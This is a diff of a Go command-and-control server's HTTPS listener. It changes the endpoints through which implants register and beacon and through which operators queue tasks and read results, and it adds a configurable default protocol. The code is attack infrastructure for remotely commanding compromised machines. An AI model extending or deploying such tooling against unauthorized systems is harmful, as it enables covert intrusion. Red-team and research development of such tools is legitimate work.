@@ -5,15 +5,26 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"strconv"
 
 	"asritha.dev/c2server/pkg/model"
 	"github.com/gin-gonic/gin"
 	"gorm.io/gorm"
 )
 
+type BeaconHTTPSRequest struct {
+	ImplantID uint           `json:"implant-id"`
+	Results   []model.Result `json:"results"`
+}
 type HTTPSListener struct {
-	db *gorm.DB
+	db                  *gorm.DB
+	defaultCommProtocol CommProtocol
+}
+
+func NewHTTPS(db *gorm.DB, defaultCommProtocol CommProtocol) *HTTPSListener {
+	return &HTTPSListener{
+		db:                  db,
+		defaultCommProtocol: defaultCommProtocol,
+	}
 }
 
 func (l *HTTPSListener) Listen() {
@@ -21,7 +32,7 @@ func (l *HTTPSListener) Listen() {
 
 	// Implant endpoints (HTTPS listener)
 	implant := router.Group("/implant")
-	implant.POST("/new", l.New)
+	implant.POST("/register", l.Register)
 	implant.POST("/beacon", l.Beacon)
 
 	// Operator endpoints
@@ -33,7 +44,7 @@ func (l *HTTPSListener) Listen() {
 	operator.POST("/tasks/:implant-id", l.OpAddTasks)
 	operator.GET("/results/:implant-id", l.OpListResults)
 
-	// TODO: keep this in?
+	// TODO: remove once SSL pinning is added
 	var err error
 	httpsBindAddr := os.Getenv("HTTPS_BIND_ADDR")
 	if httpsBindAddr[1:] == "80" {
@@ -46,7 +57,7 @@ func (l *HTTPSListener) Listen() {
 	}
 }
 
-func (l *HTTPSListener) New(c *gin.Context) {
+func (l *HTTPSListener) Register(c *gin.Context) {
 	var sysInfo model.SystemInfo
 	if err := c.ShouldBindJSON(&sysInfo); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
@@ -58,7 +69,7 @@ func (l *HTTPSListener) New(c *gin.Context) {
 		SystemInfo:   sysInfo,
 		Dwell:        "30s",
 		Jitter:       0,
-		CommProtocol: HTTPS.String(), // TODO: should be DEFAULTCOMMPROTOCOL
+		CommProtocol: l.defaultCommProtocol.String(),
 	}
 	if err := l.db.Create(implant).Error; err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
@@ -75,23 +86,15 @@ func (l *HTTPSListener) New(c *gin.Context) {
 	})
 }
 
-// rename to BeaconHTTPSRequest
-type BeaconRequest struct {
-	ImplantID uint           `json:"implant-id"`
-	Results   []model.Result `json:"results"`
-}
-
 func (l *HTTPSListener) Beacon(c *gin.Context) {
-	var req BeaconRequest
+	var req BeaconHTTPSRequest
 	if err := c.ShouldBind(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 	}
 
 	// 1) Store results and mark tasks completed
-	// TODO: if there is an errored task, it should still mark it as complete - rn its just skipping it and itll always get sent bc of its not getting back an errored result
 	for _, res := range req.Results {
 		if err := storeNewResult(l.db, req.ImplantID, res); err != nil {
-			// if you want BadRequest on missing tasks vs InternalError on DB issues // TODO: check this over
 			status := http.StatusInternalServerError
 			if errors.Is(err, gorm.ErrRecordNotFound) {
 				status = http.StatusBadRequest
@@ -140,26 +143,13 @@ func (l *HTTPSListener) OpListTasks(c *gin.Context) {
 
 func (l *HTTPSListener) OpGetTask(c *gin.Context) {
 	// pull both params
-	impIDStr := c.Param("implant-id")
-	taskIDStr := c.Param("task-id")
-
-	// TODO: update everything else to parse to uint64?
-	// parse to uint64
-	impID, err := strconv.ParseUint(impIDStr, 10, 64)
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid implant ID"})
-		return
-	}
-	taskID, err := strconv.ParseUint(taskIDStr, 10, 64)
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid task ID"})
-		return
-	}
+	implantID := c.Param("implant-id")
+	taskID := c.Param("task-id")
 
 	// fetch only if it belongs to that implant
 	var task model.Task
-	if err = l.db.
-		Where("id = ? AND implant_id = ?", taskID, impID).Preload("Results").
+	if err := l.db.
+		Where("id = ? AND implant_id = ?", taskID, implantID).Preload("Results").
 		First(&task).Error; err != nil {
 		c.JSON(http.StatusNotFound, gin.H{"error": "task not found"})
 		return
